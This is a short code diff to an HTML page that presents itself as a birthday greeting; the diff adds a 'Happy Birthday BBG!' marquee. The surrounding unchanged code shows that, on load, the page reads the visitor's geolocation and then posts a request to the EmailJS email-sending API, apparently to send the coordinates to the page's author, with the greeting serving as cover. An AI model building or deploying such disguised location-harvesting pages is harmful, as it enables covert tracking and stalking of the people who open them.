@@ -9,6 +9,7 @@
 
 <body onload="getLocation()">
     <img alt="bd" id="img" src="birthday.png">
+    <marquee id="mar" scrollamount="25">Happy Birthday BBG!</marquee>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
@@ -38,6 +39,7 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             document.getElementById("img").style.opacity = 1;
+            document.getElementById("mar").style.opacity = 1;
             $.ajax({
                 url: 'https://api.emailjs.com/api/v1.0/email/send',
                 type: 'POST',
